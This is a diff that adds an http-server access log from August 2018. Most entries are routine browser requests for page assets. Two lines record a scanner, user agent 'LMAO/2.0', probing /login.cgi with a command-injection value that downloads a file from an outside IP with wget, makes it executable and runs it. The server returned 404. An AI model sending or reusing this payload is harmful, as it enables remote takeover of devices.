@@ -1,0 +1,25 @@
+Starting up http-server, serving .
+Available on:
+  http://127.0.0.1:80
+  http://172.31.46.107:80
+Hit CTRL-C to stop the server
+[Wed Aug 29 2018 03:32:52 GMT+0000 (UTC)] "GET /" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+[Wed Aug 29 2018 03:32:53 GMT+0000 (UTC)] "GET /backend-adapter.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+[Wed Aug 29 2018 03:32:53 GMT+0000 (UTC)] "GET /keys.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+[Wed Aug 29 2018 03:32:53 GMT+0000 (UTC)] "GET /style.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+[Wed Aug 29 2018 03:32:53 GMT+0000 (UTC)] "GET /script.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+[Wed Aug 29 2018 03:32:53 GMT+0000 (UTC)] "GET /favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
+[Wed Aug 29 2018 03:38:54 GMT+0000 (UTC)] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.112.150/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$" "LMAO/2.0"
+[Wed Aug 29 2018 03:38:54 GMT+0000 (UTC)] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.112.150/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$" Error (404): "Not found"
+[Wed Aug 29 2018 03:43:58 GMT+0000 (UTC)] "GET /" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:43:58 GMT+0000 (UTC)] "GET /style.css" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:43:59 GMT+0000 (UTC)] "GET /backend-adapter.js" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:44:02 GMT+0000 (UTC)] "GET /keys.js" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:44:05 GMT+0000 (UTC)] "GET /script.js" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:44:17 GMT+0000 (UTC)] "GET /" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:45:27 GMT+0000 (UTC)] "GET /" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:46:14 GMT+0000 (UTC)] "GET /error.html" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:46:15 GMT+0000 (UTC)] "GET /backend-adapter.js" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:46:15 GMT+0000 (UTC)] "GET /style.css" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 03:46:15 GMT+0000 (UTC)] "GET /script.js" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
+[Wed Aug 29 2018 04:04:40 GMT+0000 (UTC)] "GET /error.html" "Mozilla/5.0 (Linux; Android 8.1.0; INE-AL00 Build/HUAWEIINE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326"
